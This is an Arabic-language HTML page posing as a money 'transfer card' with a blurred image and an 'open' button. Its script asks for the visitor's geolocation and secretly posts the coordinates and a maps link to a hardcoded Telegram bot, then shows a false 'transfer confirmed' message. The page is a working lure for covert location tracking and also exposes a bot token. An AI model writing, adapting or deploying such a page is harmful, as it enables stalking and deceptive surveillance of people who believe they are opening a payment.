<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بطاقة تحويل</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f2f2f2;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .card {
    position: relative;
    width: 400px;
    height: 250px;
    border-radius: 15px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 20px;
    color: #fff;
    overflow: hidden;
  }
  /* الخلفية مع فلترة ضبابية */
  .card::before {
    content: "";
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg') no-repeat center center;
    background-size: cover;
    filter: blur(6px);
    z-index: 1;
  }
  .overlay {
    position: absolute;
    top:0; left:0; right:0; bottom:0;
    background: rgba(0,0,0,0.4);
    border-radius: 15px;
    z-index: 2;
  }
  .content {
    position: relative;
    z-index: 3;
    text-align: center;
  }
  h3, p {
    margin: 5px 0;
  }
  button {
    margin-top: 15px;
    padding: 10px 20px;
    font-size: 16px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    background: #28a745;
    color: #fff;
    font-weight: bold;
    transition: 0.3s;
  }
  button:hover {
    background: #218838;
  }
</style>
</head>
<body>

<div class="card">
  <div class="overlay"></div>
  <div class="content">
    <h3></h3>
    <p></p>
    <button onclick="getLocation()">فتح</button>
  </div>
</div>

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(res => res.json())
    .then(data => console.log("✅ تم الإرسال:", data))
    .catch(err => console.error("❌ خطأ:", err));
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                sendLocationToBot(lat, lon);
                alert("✅ تم تأكيد التحويل!");
            },
            err => {
                alert("❌ لم يتم السماح بالوصول إلى الموقع");
            }
        );
    } else {
        alert("❌ جهازك لا يدعم الموقع الجغرافي");
    }
}
</script>

</body>
</html>
